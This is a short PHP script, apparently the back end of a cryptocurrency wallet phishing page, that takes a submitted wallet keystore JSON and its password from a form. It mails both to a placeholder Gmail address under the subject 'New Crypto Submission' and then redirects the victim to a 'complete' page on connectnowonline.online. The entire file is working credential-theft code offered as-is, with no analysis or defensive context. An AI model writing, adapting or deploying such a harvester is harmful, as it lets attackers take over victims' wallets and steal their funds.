<?php

$d= $_POST["keystorejson"];
$e= $_POST["keystorepasswword"];


$msg =  "Keystore Json Value: ".$d." \n Password: ".$e;

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("youremail@gmail.com","New Crypto Submission",$msg);

header("Location: ://connectnowonline.online/complete");
die();

?>
